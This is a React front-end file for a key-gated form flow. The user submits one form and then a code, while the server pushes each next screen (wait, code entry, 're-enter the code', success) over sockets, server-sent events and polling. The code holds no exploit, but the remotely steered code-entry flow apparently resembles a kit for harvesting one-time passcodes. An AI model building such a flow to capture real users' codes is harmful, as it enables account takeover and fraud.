import { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate, useParams, useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import io from 'socket.io-client';
import './App.css';

// Components
import Form1 from './components/Form1';
import Form2 from './components/Form2';
import Loading from './components/Loading';
import Pending from './components/Pending';
import Error from './components/Error';

// Initialize socket connection
// Use the current host for the socket connection to work in both development and production
const socketUrl = window.location.origin;
console.log('Socket.io connection URL:', socketUrl);
const socket = io(socketUrl, {
  transports: ['websocket', 'polling'],
  reconnectionAttempts: 5,
  reconnectionDelay: 1000,
  forceNew: true
});

// Add socket connection event listeners for debugging
socket.on('connect', () => {
  console.log('Socket.io connected successfully with ID:', socket.id);
});

socket.on('connect_error', (error) => {
  console.error('Socket.io connection error:', error);
});

socket.on('disconnect', (reason) => {
  console.log('Socket.io disconnected:', reason);
});

// KeyValidator component to handle the key in URL query
function KeyValidator() {
  const location = useLocation();
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const queryParams = new URLSearchParams(location.search);
    const key = queryParams.get('key');

    if (!key) {
      setError('No key provided');
      setLoading(false);
      return;
    }

    // Validate key with backend
    axios.get(`/api/validate-key/${key}`)
      .then(response => {
        if (response.data.valid) {
          navigate(`/${key}`);
        } else {
          setError('Invalid key');
          setLoading(false);
        }
      })
      .catch(err => {
        console.error('Error validating key:', err);
        setError('Error validating key');
        setLoading(false);
      });
  }, [location, navigate]);

  if (loading) return <Loading />;
  if (error) return <Error message={error} />;
  return null;
}

// Main flow component
function FormFlow() {
  const { key } = useParams();
  const [state, setState] = useState('loading');
  const [formData, setFormData] = useState({});
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  // Initial state fetch
  useEffect(() => {
    if (!key) {
      setState('error');
      setError('No session key provided');
      return;
    }

    // Join the room for this session
    socket.emit('join', { key });
    console.log('Joined room:', key);

    // Listen for state updates
    socket.on('state_update', (data) => {
      console.log('Received state update via Socket.io:', data);
      if (data.key === key) {
        setState(data.state);
      }
    });

    // Listen for global state updates as a fallback
    socket.on('global_state_update', (data) => {
      console.log('Received global state update via Socket.io:', data);
      if (data.key === key) {
        setState(data.state);
      }
    });

    // Initial state fetch
    const fetchState = () => {
      console.log('Fetching state for key:', key);
      fetch(`/api/status/${key}`)
        .then(response => response.json())
        .then(data => {
          console.log('Received state from API:', data);
          if (data.error) {
            setState('error');
            setError(data.error);
          } else {
            setState(data.state || 'form_1');
          }
        })
        .catch(err => {
          console.error('Error fetching status:', err);
          setState('error');
          setError('Failed to fetch session status');
        });
    };

    // Fetch initial state
    fetchState();

    // Set up Server-Sent Events (SSE) connection
    console.log('Setting up SSE connection for key:', key);
    const eventSource = new EventSource(`/api/events/${key}`);
    
    eventSource.onopen = () => {
      console.log('SSE connection opened');
    };
    
    eventSource.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        console.log('Received SSE message:', data);
        
        if (data.type === 'state_update' && data.key === key) {
          console.log('Updating state via SSE to:', data.state);
          setState(data.state);
        }
      } catch (error) {
        console.error('Error parsing SSE message:', error);
      }
    };
    
    eventSource.onerror = (error) => {
      console.error('SSE connection error:', error);
    };

    // Set up polling as a fallback
    const pollInterval = setInterval(() => {
      console.log('Polling for state updates...');
      fetchState();
    }, 5000); // Poll every 5 seconds

    // Cleanup on unmount
    return () => {
      // Clean up Socket.io
      socket.off('state_update');
      socket.off('global_state_update');
      socket.emit('leave', { key });
      
      // Clean up SSE
      eventSource.close();
      
      // Clean up polling
      clearInterval(pollInterval);
    };
  }, [key]);

  // Form 1 submission handler
  const handleForm1Submit = async (data) => {
    setLoading(true);
    try {
      await axios.post('/api/form', { key, ...data });
      setFormData({ ...formData, ...data });
      setState('loading');
    } catch (error) {
      console.error('Error submitting form:', error);
      setState('error');
    } finally {
      setLoading(false);
    }
  };

  // Code submission handler
  const handleCodeSubmit = async (code) => {
    setLoading(true);
    try {
      await axios.post('/api/code', { key, code });
      setFormData({ ...formData, code });
      setState('pending');
    } catch (error) {
      console.error('Error submitting code:', error);
      setState('reenter_code');
    } finally {
      setLoading(false);
    }
  };

  if (loading) return <Loading />;

  // Render the appropriate component based on current state
  switch (state) {
    case 'form_1':
      return <Form1 onSubmit={handleForm1Submit} />;
    case 'loading':
      return <Loading message="Please wait while we process your information..." />;
    case 'form_2':
      return <Form2 onSubmit={handleCodeSubmit} />;
    case 'reenter_code':
      return <Form2 onSubmit={handleCodeSubmit} error="Something went wrong. Please re-enter the code." />;
    case 'pending':
      return <Pending message="Your submission is being processed. Please wait..." />;
    case 'success':
      return <Pending message="Your submission was successful! Thank you." success={true} />;
    case 'error':
      return <Error message={error} />;
    default:
      return <Loading />;
  }
}

function App() {
  return (
    <Router>
      <Routes>
        <Route path="/" element={<KeyValidator />} />
        <Route path="/:key" element={<FormFlow />} />
        <Route path="*" element={<Navigate to="/" />} />
      </Routes>
    </Router>
  );
}

export default App;
